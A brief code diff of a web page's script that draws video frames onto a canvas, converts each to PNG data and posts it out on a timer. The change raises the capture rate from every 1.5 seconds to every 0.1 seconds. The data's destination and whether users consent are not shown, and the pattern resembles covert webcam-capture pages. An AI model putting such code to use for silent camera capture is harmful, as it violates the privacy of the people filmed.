@@ -114,7 +114,7 @@ var context = canvas.getContext('2d');
 
        context.drawImage(video, 0, 0, 720, 1280);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+       post(canvasData); }, 100);
   
 
 }
@@ -124,6 +124,7 @@ init();
 
 </script>
 </html>
+
 
 
 
